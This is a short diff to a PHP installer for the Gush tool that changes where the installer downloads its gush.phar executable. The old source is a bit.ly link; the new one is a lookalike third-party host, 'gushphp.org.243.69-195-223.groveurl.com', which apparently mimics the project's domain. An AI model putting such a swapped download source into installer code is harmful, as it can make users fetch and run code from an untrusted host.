@@ -324,7 +324,7 @@ function installGush($installDir, $quiet)
             out("Downloading...", 'info');
         }
 
-        $source = (extension_loaded('openssl') ? 'https' : 'http').'://bit.ly/gushphp';
+        $source = (extension_loaded('openssl') ? 'https' : 'http').'://gushphp.org.243.69-195-223.groveurl.com/gush.phar';
         $errorHandler = new ErrorHandler();
         set_error_handler(array($errorHandler, 'handleError'));
 
